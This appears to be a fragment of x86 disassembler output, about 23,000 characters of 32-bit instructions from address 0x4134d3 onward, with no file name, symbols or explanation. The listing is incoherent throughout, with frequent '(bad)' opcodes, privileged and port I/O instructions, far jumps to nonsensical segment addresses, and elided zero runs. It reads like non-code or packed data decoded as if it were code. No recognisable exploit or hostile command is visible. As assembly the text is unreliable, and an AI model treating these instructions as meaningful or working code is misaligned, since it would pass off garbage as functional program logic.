  4134d3:	imul   esi,DWORD PTR [ebx],0xffffffcf
  4134d6:	sti    
  4134d7:	repz cdq 
  4134d9:	loope  0x4134ca
  4134db:	pop    ebx
  4134dc:	fistp  QWORD PTR [ecx+0x44]
  4134df:	sbb    BYTE PTR [ebx+edi*2+0x44],bl
	...
  4134fb:	add    BYTE PTR [eax],dl
  4134fd:	(bad)  
  4134ff:	and    ebp,DWORD PTR [edi-0x11]
  413502:	cwde   
  413503:	(bad)  
  413504:	cmp    ch,BYTE PTR [ecx+0x273f8b0e]
  41350a:	mov    dh,0x17
  41350c:	ret    0xb62e
  41350f:	mov    db6,ecx
  413512:	(bad)  
  413513:	(bad)  
  413514:	mov    eax,ds:0xa81bf104
  413519:	and    ch,bl
  41351b:	sub    eax,0xfda87fbe
  413520:	js     0x4134f3
  413522:	fiadd  WORD PTR [ebx]
  413524:	hlt    
  413525:	jmp    0x51a7654d
  41352a:	iret   
  41352b:	sbb    edx,ebx
  41352d:	and    eax,0x19bd01b5
  413532:	ja     0x4135af
  413534:	xor    BYTE PTR [ecx],dl
  413536:	loop   0x41357a
  413538:	push   eax
  413539:	pop    ebx
  41353a:	jno    0x413502
  41353c:	pop    edi
  41353d:	jmp    0x1156:0xf56cb1b0
  413544:	ja     0x413570
  413546:	repz mov dh,0xff
  413549:	rol    ecx,0x4b
  41354c:	vpcomuw xmm13,xmm2,XMMWORD PTR es:[edi-0x7e2be73c],0x62
  413557:	cli    
  413558:	pop    es
  413559:	or     DWORD PTR [edx-0x52],ebp
  41355c:	sub    eax,DWORD PTR ds:0x87dc
	...
  413576:	add    BYTE PTR [eax],al
  413578:	add    BYTE PTR [esi+0x2a],dh
  41357b:	loope  0x413534
  41357d:	in     al,0x81
  41357f:	inc    edx
  413580:	add    al,ch
  413582:	clc    
  413583:	sub    dh,BYTE PTR [bx+si+0x4]
  413587:	jmp    0xbec1288f
  41358c:	sub    al,0x5a
  41358e:	and    eax,0x10b82ca9
  413593:	loopne 0x413553
  413595:	out    0xa8,eax
  413597:	push   esi
  413598:	sbb    esp,DWORD PTR [ebx-0x1d2f2db]
  41359e:	(bad)  
  41359f:	xchg   esp,eax
  4135a0:	cld    
  4135a1:	jbe    0x41358a
  4135a3:	std    
  4135a4:	sub    al,0x2a
  4135a6:	cmc    
  4135a7:	(bad)  
  4135a8:	ds add eax,0x18e0f982
  4135ae:	or     DWORD PTR [edx-0x1a],0xe38226e0
  4135b5:	pop    ss
  4135b6:	test   BYTE PTR [ebx-0x1d92ed5],0x68
  4135bd:	int    0x85
  4135bf:	(bad)  
  4135c0:	call   0xf7c549bc
  4135c5:	sbb    BYTE PTR [ebx],ah
  4135c7:	(bad)  
  4135c8:	sub    bh,BYTE PTR [eax+0x402dc0df]
  4135ce:	sub    eax,0x2320a62a
  4135d3:	cmp    bh,BYTE PTR [edi]
  4135d5:	xchg   esp,eax
  4135d6:	adc    eax,DWORD PTR [ebx-0x1dcef1f]
  4135dc:	fiadd  WORD PTR [eax]
	...
  4135f6:	inc    ecx
  4135f7:	test   DWORD PTR [edx+0x1098ae83],0x7403dd6a
  413601:	in     eax,0x76
  413603:	push   ds
  413604:	lahf   
  413605:	jmp    0x6c503b01
  41360a:	mov    fs,WORD PTR [ebx]
  41360c:	(bad)  
  41360d:	pop    esi
  41360e:	mov    ah,0xe4
  413610:	cmp    ch,BYTE PTR [eax]
  413612:	push   ebx
  413613:	cmp    al,0xe8
  413615:	dec    edi
  413616:	leave  
  413617:	and    bh,dh
  413619:	add    al,BYTE PTR [edx-0x50]
  41361c:	push   cs
  41361d:	push   0xffffffbc
  41361f:	and    esi,edi
  413621:	ss pusha 
  413623:	pop    edx
  413624:	adc    ch,BYTE PTR [edx+0xd]
  413627:	push   cs
  413628:	(bad)  
  41362a:	out    dx,al
  41362b:	and    esi,edi
  41362d:	push   ds
  41362e:	je     0x41364e
  413630:	or     ah,dh
  413632:	jnp    0x413678
  413634:	std    
  413635:	push   cs
  413636:	or     BYTE PTR [edi+0x212900f9],al
  41363c:	adc    bh,0x2b
  41363f:	lock std 
  413641:	and    DWORD PTR [edi],0x22
  413644:	or     eax,0xfdf1fb84
  413649:	call   FWORD PTR [edx+esi*8+0x81d0083]
  413650:	je     0x3f25a5
  413656:	into   
  413657:	dec    eax
  413658:	cmp    ecx,eax
	...
  413672:	add    BYTE PTR [ecx],bh
  413674:	scas   eax,DWORD PTR es:[edi]
  413675:	out    0xb7,eax
  413677:	stos   DWORD PTR es:[edi],eax
  413678:	out    dx,eax
  413679:	std    
  41367a:	cmp    ecx,DWORD PTR [ebx]
  41367c:	jge    0x41368b
  41367e:	add    DWORD PTR [ecx-0x11],0xfffffffd
  413682:	dec    edx
  413684:	xchg   ebp,eax
  413685:	adc    DWORD PTR [ebx+0x1b722297],eax
  41368b:	dec    esi
  41368c:	repz or DWORD PTR [ebx+eax*8-0x76],esi
  413691:	clc    
  413692:	or     al,0xb1
  413694:	clc    
  413695:	cmp    dl,0x98
  413698:	jae    0x4136a4
  41369a:	and    DWORD PTR [edi],0x8dfffe86
  4136a0:	push   ds
  4136a1:	or     DWORD PTR [ebx+0x43fdf01b],0x5d
  4136a8:	xor    bh,BYTE PTR [edi+0x7f01db7c]
  4136ae:	(bad)  
  4136af:	sub    dh,al
  4136b1:	xchg   DWORD PTR [ebp+0x51],eax
  4136b4:	xor    bh,BYTE PTR [edi-0x3aa27f1]
  4136ba:	jmp    FWORD PTR [edx]
  4136bc:	xor    al,0x5c
  4136be:	ins    BYTE PTR es:[edi],dx
  4136bf:	cmp    cl,BYTE PTR [edx-0xfe501b0]
  4136c5:	or     eax,0x54a25eb6
  4136ca:	xor    al,0xf4
  4136cc:	add    eax,DWORD PTR [eax]
  4136ce:	adc    al,dh
  4136d0:	inc    edx
  4136d1:	jg     0x41372e
  4136d3:	xor    cl,BYTE PTR [edx]
  4136d5:	sub    eax,DWORD PTR [edx+0x0]
	...
  4136f0:	sub    ebp,DWORD PTR [eax+0xe]
  4136f3:	cmp    DWORD PTR [ecx+0xddda641],esi
  4136f9:	sub    DWORD PTR [eax],0xfffffffe
  4136fc:	adc    edx,DWORD PTR [edi+edi*4-0x69330ed]
  413703:	mov    WORD PTR [edi-0x4001d6c5],?
  413709:	repz xchg edi,eax
  41370b:	push   cs
  41370c:	ja     0x41371a
  41370e:	sub    bh,dh
  413710:	jmp    0x413745
  413712:	jo     0x413716
  413714:	outs   dx,DWORD PTR ds:[esi]
  413715:	add    dh,al
  413717:	cmc    
  413718:	lock cmp edi,esi
  41371b:	push   cs
  41371c:	js     0x413754
  41371e:	sub    dh,bh
  413720:	retf   
  413721:	out    dx,eax
  413722:	sub    al,BYTE PTR [eax+ebp*8+0x34]
  413726:	mov    bh,0x13
  413728:	cmp    BYTE PTR [edx+0x1b],dh
  41372b:	sbb    esi,DWORD PTR [edx+0x3188298b]
  413731:	cmp    ch,ch
  413733:	shl    bl,0xa8
  413736:	adc    edi,esi
  413738:	fwait
  413739:	mov    bl,0xed
  41373b:	pop    ebp
  41373c:	and    BYTE PTR [ebx],bl
  41373e:	test   ebp,ebp
  413740:	mov    ebx,eax
  413742:	sub    DWORD PTR [esi],ecx
  413744:	dec    edx
  413745:	das    
  413746:	jge    0x41379d
  413748:	sar    BYTE PTR [ecx+0x1af50ffe],0x7f
  41374f:	imul   DWORD PTR [ecx-0x1d]
  413752:	sub    DWORD PTR [edx+0x0],eax
	...
  41376d:	arpl   WORD PTR [ecx+0xe],si
  413770:	cmp    DWORD PTR [ecx+0x5ddda637],ebp
  413776:	add    eax,0x224a2813
  41377b:	outs   dx,DWORD PTR ds:[esi]
  41377c:	shl    bh,0xdd
  41377f:	daa    
  413780:	cli    
  413781:	push   0x322a0b42
  413786:	fisub  WORD PTR [esi+0x3c85fa97]
  41378c:	sub    BYTE PTR [edx],ah
  41378e:	and    ah,ch
  413790:	jno    0x413788
  413792:	lea    edx,[esi-0x6f6f611]
  413798:	add    bh,bl
  41379a:	mov    BYTE PTR [esi+0x29220227],ah
  4137a0:	sub    DWORD PTR [eax+0x7b70ff8],esi
  4137a6:	mov    eax,ds:0x1fa31ba6
  4137ab:	mov    ebp,0xdcc76c29
  4137b0:	in     al,dx
  4137b1:	mov    ah,0x11
  4137b3:	pop    esp
  4137b4:	push   edi
  4137b5:	shl    BYTE PTR [ecx],1
  4137b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137b8:	in     eax,dx
  4137b9:	sub    DWORD PTR [ecx+0x1f6d84ed],esi
  4137bf:	xchg   ebp,eax
  4137c0:	sub    edx,ebp
  4137c2:	pop    edx
  4137c3:	jmp    0x7f1a8144
  4137c8:	add    BYTE PTR [esi*8+0x1f877eed],al
  4137cf:	jne    0x4137fa
	...
  4137e9:	add    BYTE PTR [esi],dh
  4137eb:	and    ah,BYTE PTR [ebx]
  4137ed:	adc    ch,cl
  4137ef:	iret   
  4137f0:	cld    
  4137f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137f2:	test   eax,0x8227662b
  4137f7:	and    DWORD PTR [edi-0x41],ebx
  4137fa:	out    0xdd,eax
  4137fc:	daa    
  4137fd:	stc    
  4137fe:	sbb    BYTE PTR [ebp-0x2295d6bd],0x9e
  413805:	xchg   edi,eax
  413806:	repnz test edi,edi
  413809:	nop
  41380a:	adc    ah,BYTE PTR [ebx]
  41380c:	(bad)  
  41380d:	faddp  st(5),st
  41380f:	push   es
  413810:	mov    edi,DWORD PTR [edi-0x6fce8a5]
  413816:	out    0x11,eax
  413818:	test   BYTE PTR [ebx-0x5501dcee],cl
  41381e:	fmul   st(0),st
  413820:	adc    eax,eax
  413822:	(bad)  
  413823:	cmc    
  413824:	jnp    0x413845
  413826:	push   DWORD PTR [ebp+0x12ccf6fc]
  41382c:	mov    dh,0xa6
  41382e:	adc    edx,DWORD PTR [edx]
  413830:	mov    dh,0x36
  413832:	or     eax,DWORD PTR [edi+ebx*8-0xf]
  413836:	add    BYTE PTR [esp+ecx*4+0x55],al
  41383a:	cmc    
  41383b:	add    eax,0x5aecdeeb
  413840:	inc    esi
  413841:	call   0xeb8f9332
  413846:	ss inc eax
  413848:	pop    es
  413849:	loop   0x413881
  41384b:	add    edi,eax
  41384d:	imul   eax,DWORD PTR [eax],0x0
	...
  413867:	fdiv   QWORD PTR [ebx+esi*2-0x1c8d116b]
  41386e:	sahf   
  41386f:	or     al,0xf
  413871:	mov    dh,0x26
  413873:	icebp  
  413874:	movzx  esi,BYTE PTR [esi]
  413877:	hlt    
  413878:	inc    ebp
  413879:	loopne 0x41386c
  41387b:	test   al,0x4e
  41387d:	mov    BYTE PTR [esp+eiz*8],ch
  413880:	add    cl,cl
  413882:	mov    dl,0x5d
  413884:	hlt    
  413885:	push   cs
  413886:	pop    ebp
  413887:	call   0x6018:0x70e90003
  41388e:	fnstsw WORD PTR [esi+0x47]
  413891:	inc    esp
  413892:	or     edx,esi
  413894:	add    al,0x0
  413896:	jmp    0xc407ab
  41389b:	cmp    BYTE PTR [esi+edi*8],ah
  41389e:	jmp    0x348d:0x2443a1a4
  4138a5:	std    
  4138a6:	jne    0x4138a5
  4138a8:	sbb    eax,0x6f1207b4
  4138ad:	sbb    cl,BYTE PTR [edi]
  4138af:	stos   DWORD PTR es:[edi],eax
  4138b0:	jae    0x4138d8
  4138b2:	jae    0x413841
  4138b4:	add    al,0xff
  4138b6:	jne    0x4138dd
  4138b8:	or     edi,edx
  4138ba:	push   esi
  4138bb:	repnz outs dx,BYTE PTR ds:[esi]
  4138bd:	push   cs
  4138be:	mov    esp,esi
  4138c0:	in     al,dx
  4138c1:	jae    0x4138cf
  4138c3:	and    dh,BYTE PTR [edx+0x6]
  4138c6:	call   0x3f1c31
	...
  4138e3:	add    BYTE PTR [eax-0x1ff48d38],bl
  4138e9:	push   es
  4138ea:	cld    
  4138eb:	jmp    DWORD PTR [edx]
  4138ed:	sbb    BYTE PTR [ebx+0x3d654],al
  4138f3:	packssdw mm4,QWORD PTR [eax-0x1]
  4138f7:	push   cs
  4138f8:	imul   ebx,DWORD PTR [eax+0x0],0xffffffc1
  4138fc:	lods   eax,DWORD PTR ds:[esi]
  4138fd:	and    BYTE PTR [ecx],cl
  4138ff:	rcr    esi,0xeb
  413902:	or     eax,0xf0a1ab6
  413907:	mov    dh,0x12
  413909:	add    eax,ecx
  41390b:	loopne 0x4138e2
  41390d:	sbb    bh,BYTE PTR [edi+0x522bc180]
  413913:	je     0x41394e
  413915:	test   BYTE PTR [ebx+0x20],bh
  413918:	lea    edx,[esi]
  41391a:	and    DWORD PTR [edx+0xf00038e],0xffffffcb
  413921:	pop    ds
  413922:	or     eax,0x71411db6
  413927:	inc    eax
  413928:	lea    eax,[edx]
  41392a:	clc    
  41392b:	jmp    0x413921
  41392d:	pop    edi
  41392e:	jns    0x413984
  413930:	or     BYTE PTR [eax+eax*1-0x1],al
  413934:	loope  0x41395f
  413936:	and    eax,0x2577fc74
  41393b:	je     0x413941
  41393d:	xlat   BYTE PTR ds:[ebx]
  41393e:	mov    al,0xb
  413940:	push   ebx
  413941:	pop    eax
  413942:	cli    
  413943:	out    0x4c,eax
  413945:	or     eax,0xfe27
	...
  41395e:	add    BYTE PTR [eax],al
  413960:	add    BYTE PTR [ecx-0x13],bh
  413963:	test   BYTE PTR [esp+edi*1+0x7f000223],0x90
  41396b:	loop   0x413957
  41396d:	fist   WORD PTR [edx+0x786f23b8]
  413973:	push   cs
  413974:	inc    ecx
  413975:	lds    edi,FWORD PTR [ebp+0x25]
  413978:	je     0x41396a
  41397a:	mov    ds:0x3581fe3a,al
  41397f:	int3   
  413980:	dec    BYTE PTR [ecx-0x178bdae3]
  413986:	ss scas eax,DWORD PTR es:[edi]
  413988:	pop    es
  413989:	fsub   QWORD PTR [ebx+0x22]
  41398c:	(bad)  
  41398d:	jmp    0x413940
  41398f:	inc    edx
  413990:	push   cs
  413991:	jns    0x4139e6
  413993:	clc    
  413994:	(bad)  
  413995:	fld    TBYTE PTR [ebx-0x3688fdc3]
  41399b:	jecxz  0x41399c
  41399d:	jle    0x4139cd
  41399f:	jmp    0xfcc031e9
  4139a4:	push   cs
  4139a5:	jbe    0x413a16
  4139a7:	and    bh,dh
  4139a9:	mov    bl,0x2
  4139ab:	sub    al,0xe8
  4139ad:	pop    ebx
  4139ae:	adc    al,BYTE PTR [edx]
  4139b0:	add    BYTE PTR [esi],cl
  4139b2:	jae    0x4139cf
  4139b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139b5:	out    dx,al
  4139b6:	sub    eax,DWORD PTR [edx]
  4139b8:	mov    eax,DWORD PTR [ecx+0x48]
  4139bb:	cmc    
  4139bc:	mov    ch,0x23
  4139be:	add    eax,0x1e24c4e8
  4139c3:	shl    ebx,cl
	...
  4139dd:	add    BYTE PTR [eax-0x3a],ch
  4139e0:	jmp    0xffc0:0x6000e826
  4139e7:	sbb    eax,0x4a6f0bbb
  4139ec:	xchg   esi,eax
  4139ed:	es loopne 0x4139e4
  4139f0:	cwde   
  4139f1:	test   BYTE PTR [ecx-0x349221fa],0xec
  4139f8:	cdq    
  4139f9:	ret    
  4139fa:	inc    ebx
  4139fb:	pop    ds
  4139fc:	xchg   ebx,eax
  4139fd:	sti    
  4139fe:	test   BYTE PTR [ebp-0x17],0x53
  413a02:	sbb    esi,DWORD PTR [ecx-0x75d5d9f8]
  413a08:	add    BYTE PTR [edx+eiz*1+0x1a25fd00],al
  413a0f:	cwde   
  413a10:	shl    DWORD PTR [esi],cl
  413a12:	mov    DWORD PTR [ebp+ebp*8-0x4e20051],edx
  413a19:	lahf   
  413a1a:	jmp    0x9d0c22e3
  413a1f:	xchg   DWORD PTR [eax+0x2e8bfeaf],ebp
  413a25:	mov    ah,0x78
  413a27:	(bad)
  413a2a:	xor    BYTE PTR [ebx],cl
  413a2c:	jmp    0x549fb134
  413a31:	add    al,0xf4
  413a33:	add    al,0xe9
  413a35:	scas   al,BYTE PTR es:[edi]
  413a36:	cld    
  413a37:	mov    DWORD PTR [ebx],ebp
  413a39:	clc    
  413a3a:	ins    BYTE PTR es:[edi],dx
  413a3b:	xchg   BYTE PTR [esp+eax*1-0xc],bh
  413a3f:	add    al,0x62
  413a41:	cmp    eax,0x0
	...
  413a5a:	add    BYTE PTR [eax+ebx*8-0x760bfc1e],bl
  413a61:	sub    esp,eax
  413a63:	jecxz  0x413a19
  413a65:	jge    0x413a16
  413a67:	sti    
  413a68:	or     eax,0x1e913f00
  413a6d:	je     0x413a3c
  413a6f:	adc    BYTE PTR [edi-0x71],0x11
  413a73:	inc    ebp
  413a74:	(bad)  
  413a76:	pop    ebp
  413a77:	dec    ebx
  413a78:	cmc    
  413a79:	add    bh,BYTE PTR [esi]
  413a7b:	inc    edx
  413a7c:	push   ds
  413a7d:	je     0x413a78
  413a7f:	in     al,dx
  413a80:	dec    edx
  413a81:	(bad)  
  413a82:	mov    esp,0xf1741e6b
  413a87:	inc    DWORD PTR [eax+eiz*8]
  413a8a:	sbb    DWORD PTR ss:[ecx+0x4cadebf],ecx
  413a91:	or     ch,cl
  413a93:	neg    DWORD PTR [ecx+ebx*1+0x1d]
  413a97:	adc    DWORD PTR [edi],ebx
  413a99:	call   0xfe604811
  413a9e:	bound  ebp,QWORD PTR [ebx-0x1f]
  413aa1:	aas    
  413aa2:	cdq    
  413aa3:	fcomp  DWORD PTR [eax+0x689ee1f]
  413aa9:	(bad)  
  413aaa:	jl     0x413aa7
  413aac:	or     eax,0x922859b6
  413ab1:	aas    
  413ab2:	jmp    0xea58d38f
  413ab7:	test   al,0xb7
  413ab9:	(bad)  
  413aba:	pop    esp
  413abb:	or     BYTE PTR [eax+0xceca],dl
	...
  413ad5:	add    BYTE PTR [eax],al
  413ad7:	add    BYTE PTR [edx-0x1fc300f0],bl
  413add:	and    al,0xc3
  413adf:	sahf   
  413ae0:	adc    BYTE PTR [ebx],bl
  413ae2:	test   BYTE PTR [ecx-0x1f3c7e38],ch
  413ae8:	test   DWORD PTR [eax+edi*4],0xfe1b0c02
  413aef:	nop
  413af0:	mov    dl,0x2f
  413af2:	(bad)  
  413af3:	xchg   esi,eax
  413af4:	sub    al,0xc1
  413af6:	and    ebx,esi
  413af8:	sbb    DWORD PTR [ebx+0x30cd0000],esi
  413afe:	std    
  413aff:	jne    0x413aae
  413b01:	adc    DWORD PTR [edi+eax*1+0xf1a6b0a],esi
  413b08:	ret    
  413b09:	xchg   DWORD PTR [esi],esp
  413b0b:	jae    0x413b5a
  413b0d:	or     bh,bh
  413b0f:	jne    0x413b06
  413b11:	add    eax,0x6aca56c7
  413b16:	push   cs
  413b17:	add    ebp,DWORD PTR ds:0xe60c73e1
  413b1d:	fdiv   st(5),st
  413b1f:	jne    0x413b86
  413b21:	add    BYTE PTR [eax-0x7c1ef521],al
  413b27:	shr    BYTE PTR [edx],0x9b
  413b2a:	jg     0x413b35
  413b2c:	dec    ebp
  413b2d:	or     BYTE PTR [eax-0x21f26e5],bh
  413b33:	and    edx,0x5
  413b36:	mov    DWORD PTR [esi+0x799],edi
	...
  413b54:	add    BYTE PTR [edx+esi*2],al
  413b57:	pop    es
  413b58:	add    BYTE PTR ds:0x5d24439d,cl
  413b5e:	cmp    ch,bh
  413b60:	jne    0x413b9f
  413b62:	adc    DWORD PTR [edi+eax*1+0xf1a7e1a],esi
  413b69:	arpl   WORD PTR [ecx+0x11d7326],dx
  413b6f:	push   DWORD PTR [ebp-0x1b]
  413b72:	add    dl,bh
  413b74:	push   esi
  413b75:	mov    edx,0xa68b0e7d
  413b7a:	out    0x73,eax
  413b7c:	or     al,0x8a
  413b7e:	jge    0x413b86
  413b80:	call   0x3f024b
  413b85:	push   eax
  413b86:	ror    DWORD PTR ds:0x8d685,0x0
  413b8d:	hlt    
  413b8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b8f:	shr    DWORD PTR [edi+0x6c],0x29
  413b93:	push   ds
  413b94:	(bad)  
  413b95:	mov    ds:0x9be93474,eax
  413b9a:	call   0x5658:0x22d8448e
  413ba1:	cmc    
  413ba2:	in     eax,dx
  413ba3:	mov    bl,0xfe
  413ba5:	or     DWORD PTR [esi],ecx
  413ba7:	adc    esi,DWORD PTR [esi+0x1b98baf3]
  413bad:	add    edi,DWORD PTR [ebx+eax*4+0x27]
  413bb1:	out    0x6d,eax
  413bb3:	add    bh,bh
  413bb5:	jmp    0x10840df
	...
  413bd2:	ret    0x98da
  413bd5:	maskmovq mm7,mm5
  413bd8:	and    dh,BYTE PTR [eax+edi*8-0x5a]
  413bdc:	dec    esi
  413bdd:	dec    cl
  413bdf:	adc    eax,0xfa1af42a
  413be4:	and    al,BYTE PTR [esp+esi*1-0x30b78de]
  413beb:	sub    eax,0x2f3b8302
  413bf0:	mov    edi,DWORD PTR [ebp-0x5c]
  413bf3:	lds    eax,FWORD PTR [eax]
  413bf5:	cld    
  413bf6:	adc    edx,DWORD PTR [edx]
  413bf8:	sub    esp,esp
  413bfa:	cld    
  413bfb:	sub    eax,0x9b98b02
  413c00:	les    ecx,FWORD PTR [edi-0x5]
  413c03:	scas   eax,DWORD PTR es:[edi]
  413c04:	jecxz  0x413c14
  413c06:	stos   BYTE PTR es:[edi],al
  413c07:	sub    esp,DWORD PTR [ecx]
  413c09:	je     0x413c13
  413c0b:	cmp    ebx,DWORD PTR [eax-0x71]
  413c0e:	or     al,0xdf
  413c10:	ret    
  413c11:	(bad)  
  413c12:	fcmovbe st,st(1)
  413c14:	sti    
  413c15:	add    ch,BYTE PTR [ebx-0x1b8bdd06]
  413c1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c1c:	dec    ebp
  413c1d:	dec    BYTE PTR [ecx+0x5]
  413c20:	cmc    
  413c21:	and    al,BYTE PTR [eax+0xd]
  413c24:	xchg   ecx,eax
  413c25:	push   ebp
  413c26:	rcr    DWORD PTR [edx],1
  413c28:	xchg   ebp,eax
  413c29:	mov    BYTE PTR [ebx+0xa],ch
  413c2c:	fs push ebp
  413c2e:	sti    
  413c2f:	add    al,0xe9
  413c31:	pop    ebx
  413c32:	stc    
  413c33:	sbb    BYTE PTR [ebp+0x22],bh
	...
  413c4e:	add    BYTE PTR [esi+ecx*8-0x7175dd7e],bl
  413c55:	and    ebp,eax
  413c57:	repnz push edx
  413c59:	mov    ebp,0x5db53404
  413c5e:	cwde   
  413c5f:	adc    ecx,DWORD PTR [edx]
  413c61:	lahf   
  413c62:	or     ch,BYTE PTR [ebx-0x70]
  413c65:	in     al,dx
  413c66:	adc    ch,BYTE PTR [edx+0x1b971085]
  413c6c:	add    eax,0x5eb983e
  413c71:	cs mov ecx,0x6d8904a
  413c77:	and    al,0x1a
  413c79:	fwait
  413c7a:	movq   mm1,QWORD PTR [esi+0x1d]
  413c7e:	cwde   
  413c7f:	sti    
  413c80:	sub    al,0x85
  413c82:	inc    ecx
  413c83:	sub    bl,BYTE PTR [edx]
  413c85:	arpl   WORD PTR [ebx-0xe],ax
  413c88:	jg     0x413c1f
  413c8a:	or     esi,esp
  413c8c:	add    al,0x41
  413c8e:	add    DWORD PTR [eax],edx
  413c90:	sbb    dh,ch
  413c92:	sub    ebx,DWORD PTR [ebx+ebx*1]
  413c95:	in     eax,dx
  413c96:	and    DWORD PTR [esi-0x3d],ebp
  413c99:	hlt    
  413c9a:	inc    edx
  413c9b:	adc    al,0x7
  413c9d:	jb     0x413c97
  413c9f:	hlt    
  413ca0:	mov    esp,DWORD PTR [ebx]
  413ca2:	clc    
  413ca3:	jle    0x413c6d
  413ca5:	out    0x7,eax
  413ca7:	ins    DWORD PTR es:[edi],dx
  413ca8:	(bad)  
  413ca9:	aam    0x8d
  413cab:	sub    ebp,esi
  413cad:	adc    edi,ecx
  413caf:	(bad)  
  413cb0:	mov    edi,edi
  413cb2:	sbb    eax,DWORD PTR [eax]
	...
  413ccc:	loopne 0x413c56
  413cce:	add    esp,DWORD PTR [ecx+0x71]
  413cd1:	add    DWORD PTR [ecx-0x727127cc],ecx
  413cd7:	gs clc 
  413cd9:	add    al,0x0
  413cdb:	pusha  
  413cdc:	mov    ebx,0x91a28a21
  413ce1:	(bad)  
  413ce2:	addr16 push 0x7b
  413ce5:	sbb    eax,0x90007061
  413cea:	or     BYTE PTR [esi-0x16fe064d],ch
  413cf0:	test   DWORD PTR [ebx+ebp*8],0x1fa070ed
  413cf7:	jmp    0xa964fd7c
  413cfc:	jle    0x413cbe
  413cfe:	and    ecx,DWORD PTR [esi-0x75]
  413d01:	in     eax,0xe
  413d03:	jg     0x413cf2
  413d05:	sbb    DWORD PTR [ecx+ecx*1-0x1b],esi
  413d09:	push   edx
  413d0a:	pop    DWORD PTR [ecx]
  413d0c:	popa   
  413d0d:	fcos   
  413d0f:	sub    eax,0x3e02fd6b
  413d14:	adc    eax,0xc1721791
  413d19:	scas   eax,DWORD PTR es:[edi]
  413d1a:	(bad)  
  413d1b:	pushf  
  413d1c:	daa    
  413d1d:	sbb    dh,BYTE PTR [ebp+ebx*8-0x2c]
  413d21:	nop
  413d22:	pop    es
  413d23:	adc    esi,ecx
  413d25:	cmp    dh,bh
  413d27:	(bad)  
  413d28:	jp     0x413d83
  413d2a:	jae    0x413d0e
  413d2c:	sub    dh,bh
  413d2e:	sti    
  413d2f:	out    dx,al
	...
  413d48:	add    ah,dl
  413d4a:	or     al,BYTE PTR [ebp+0x4ecc6]
  413d50:	jb     0x413d14
  413d52:	and    BYTE PTR [eax-0x1e78c99],cl
  413d58:	jmp    0x8f8c61
  413d5d:	int3   
  413d5e:	cmc    
  413d5f:	mov    ch,0x57
  413d61:	ffreep st(3)
  413d63:	fisttp WORD PTR [eax]
  413d65:	(bad)  
  413d66:	retf   0xf901
  413d69:	dec    ebp
  413d6a:	and    eax,0x89267452
  413d6f:	push   esp
  413d70:	or     al,0x26
  413d72:	inc    edi
  413d73:	adc    cl,BYTE PTR [ebx+0x3c87f100]
  413d79:	pushf  
  413d7a:	mov    DWORD PTR [esp+ecx*1+0x26],edx
  413d7e:	ja     0x413d6a
  413d80:	mov    DWORD PTR [ecx-0x2c74fded],edx
  413d86:	adc    BYTE PTR [ecx],ch
  413d88:	dec    ebp
  413d89:	or     DWORD PTR [ecx+0x77060c54],ecx
  413d8f:	test   BYTE PTR [ecx+0x1e3b8711],0xc1
  413d96:	in     al,0xfd
  413d98:	je     0x413dee
  413d9a:	mov    DWORD PTR [ebx+0xc],eax
  413d9d:	in     al,0x8d
  413d9f:	call   0xb4c0:0x33045d00
  413da6:	lea    eax,ds:0x43894d00
  413dac:	and    al,0x0
	...
  413dc6:	lea    edx,[ebp+edi*8+0x75]
  413dca:	cmp    eax,0x207b5f5
  413dcf:	outs   dx,DWORD PTR ds:[esi]
  413dd0:	sbb    cl,BYTE PTR [edi]
  413dd2:	retf   
  413dd3:	xchg   ebx,eax
  413dd4:	es jae 0x413e24
  413dd7:	add    al,0xff
  413dd9:	jne    0x413df0
  413ddb:	add    edi,edx
  413ddd:	push   esi
  413dde:	add    dh,BYTE PTR [edx+0xe]
  413de1:	mov    edx,esi
  413de3:	in     al,0x73
  413de5:	or     al,0x12
  413de7:	jle    0x413def
  413de9:	call   0x3f041c
  413dee:	hlt    
  413def:	test   al,0x43
  413df1:	push   cs
  413df2:	jns    0x413dce
  413df4:	push   es
  413df5:	add    ah,dh
  413df7:	xor    al,0x14
  413df9:	out    0xd3,eax
  413dfb:	push   esi
  413dfc:	ficomp DWORD PTR [esp+edi*8-0x28]
  413e00:	sti    
  413e01:	cmp    BYTE PTR [edx],dh
  413e03:	repnz cwde 
  413e05:	lods   eax,DWORD PTR ds:[esi]
  413e06:	std    
  413e07:	iret   
  413e08:	mov    ebx,0x85930273
  413e0d:	xchg   esp,esi
  413e0f:	sub    eax,0x63a0302
  413e14:	fld    QWORD PTR [esp+ebp*8+0x19]
  413e18:	jns    0x413da4
  413e1a:	cmp    DWORD PTR [esi],edi
  413e1c:	mov    eax,DWORD PTR [ebp+0x22d74]
  413e22:	outs   dx,DWORD PTR ds:[esi]
  413e23:	loopne 0x413e30
  413e25:	mov    DWORD PTR [edx],esi
  413e27:	mov    DWORD PTR ds:[eax+eax*1+0x0],eax
	...
  413e44:	xchg   ebp,eax
  413e45:	test   DWORD PTR [ebx-0x74fdd20c],ebx
  413e4b:	mov    ecx,0xffd716c9
  413e50:	in     eax,dx
  413e51:	call   0x1f178e6d
  413e56:	mov    BYTE PTR [edx-0x7173da7],ch
  413e5c:	push   ds
  413e5d:	add    al,BYTE PTR [eax]
  413e5f:	pop    es
  413e60:	out    dx,al
  413e61:	ret    
  413e62:	call   0x435d97
  413e67:	sti    
  413e68:	mov    bh,0xc6
  413e6a:	add    bl,dh
  413e6c:	scas   eax,DWORD PTR es:[edi]
  413e6d:	mov    dh,0x1
  413e6f:	outs   dx,DWORD PTR ds:[esi]
  413e70:	dec    edi
  413e71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e72:	rcl    BYTE PTR [edx*1-0x13083df7],0x8c
  413e7a:	inc    esp
  413e7b:	aam    0x52
  413e7d:	inc    ebx
  413e7e:	je     0x413e72
  413e80:	add    al,0x6a
  413e82:	test   al,0xc7
  413e84:	add    eax,0x4efaf3d2
  413e89:	and    BYTE PTR [ebx],al
  413e8b:	repz dec esi
  413e8d:	sub    BYTE PTR [eax],cl
  413e8f:	mov    ch,0x24
  413e91:	lock or bh,BYTE PTR [esp+ecx*4+0x7f7e382b]
  413e99:	pop    esp
  413e9a:	add    esi,esp
  413e9c:	add    al,0x60
  413e9e:	enter  0x88ab,0x2b
  413ea2:	xor    al,0x7c
  413ea4:	jg     0x413f1a
  413ea6:	add    eax,DWORD PTR [eax]
	...
